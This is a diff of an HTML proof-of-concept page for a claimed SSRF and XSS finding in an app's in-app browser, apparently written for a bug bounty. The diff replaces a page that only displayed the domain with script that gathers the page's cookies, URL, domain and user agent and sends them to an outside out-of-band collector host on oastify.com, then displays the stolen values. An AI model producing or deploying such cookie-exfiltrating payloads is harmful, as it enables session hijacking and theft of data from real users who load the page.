@@ -1,60 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>XSS + SSRF</title>
+  <title>SSRF + XSS</title>
   <style>
     * { margin: 0; padding: 0; }
     body {
-      background: #ff0000;
+      background: #c00;
       color: white;
-      font-family: Arial, sans-serif;
+      font-family: 'Courier New', monospace;
       text-align: center;
-      padding: 50px;
+      padding: 40px;
     }
     .box {
-      background: rgba(0,0,0,0.8);
-      padding: 40px;
-      border-radius: 20px;
+      background: rgba(0,0,0,0.7);
+      padding: 30px;
+      border-radius: 15px;
       display: inline-block;
       max-width: 90%;
-      box-shadow: 0 0 30px rgba(0,0,0,0.5);
+      box-shadow: 0 0 20px #000;
     }
-    h1 { font-size: 36px; margin-bottom: 20px; }
-    p { font-size: 20px; margin: 15px 0; }
-    .proof { 
-      background: #000; 
-      padding: 15px; 
-      border-radius: 10px; 
-      font-family: monospace; 
-      margin: 20px 0; 
+    h1 { font-size: 32px; margin-bottom: 15px; }
+    p { font-size: 18px; margin: 10px 0; }
+    .data {
+      background: #000;
+      color: #0f0;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 15px 0;
       text-align: left;
+      font-family: monospace;
+      word-break: break-all;
     }
-    .domain { color: #00ff00; font-weight: bold; }
+    .oast { color: #ff0; font-weight: bold; }
   </style>
 </head>
 <body>
   <div class="box">
     <h1>SSRF + XSS CONFIRMED</h1>
-    <p>This page was loaded via <strong>Server-Side Request Forgery</strong>.</p>
     <p>JavaScript is executing in the in-app browser.</p>
-    
-    <div class="proof">
-      <p><strong>Loaded URL:</strong><br>
-      https://dheerendrapajapati-cell.github.io/test/xss2.html</p>
-      
-      <p><strong>Via Parameter:</strong><br>
-      FILEUNIQNAME</p>
-      
-      <p><strong>App Domain:</strong><br>
-      <span class="domain" id="domain">Loading...</span></p>
-    </div>
-    
-    <p><strong>BUG BOUNTY: $25,000+</strong></p>
+    <p>Data sent to: <span class="oast">1dfqk9mrszun3xw50ebubntp3g97x2lr.oastify.com</span></p>
+
+    <div class="data" id="output">Sending data...</div>
   </div>
 
   <script>
-    // This runs — proves JS execution
-    document.getElementById('domain').textContent = document.domain || 'Blocked (still XSS)';
+    // === OASTIFY DATA EXFILTRATION ===
+    const oast = 'https://1dfqk9mrszun3xw50ebubntp3g97x2lr.oastify.com';
+
+    const payload = new URLSearchParams({
+      domain: document.domain || 'blocked',
+      cookie: document.cookie || 'none',
+      url: location.href,
+      ua: navigator.userAgent,
+      time: Date.now()
+    });
+
+    // Fire & forget (no-cors)
+    fetch(oast + '?' + payload, { mode: 'no-cors' }).catch(() => {});
+
+    // === VISUAL PROOF ===
+    setTimeout(() => {
+      document.getElementById('output').innerHTML = `
+        <strong>Domain:</strong> ${document.domain || 'blocked'}<br>
+        <strong>Cookie:</strong> ${document.cookie || 'none'}<br>
+        <strong>URL:</strong> ${location.href}<br>
+        <strong>OAST HIT!</strong> Check your dashboard.
+      `;
+    }, 800);
   </script>
 </body>
 </html>
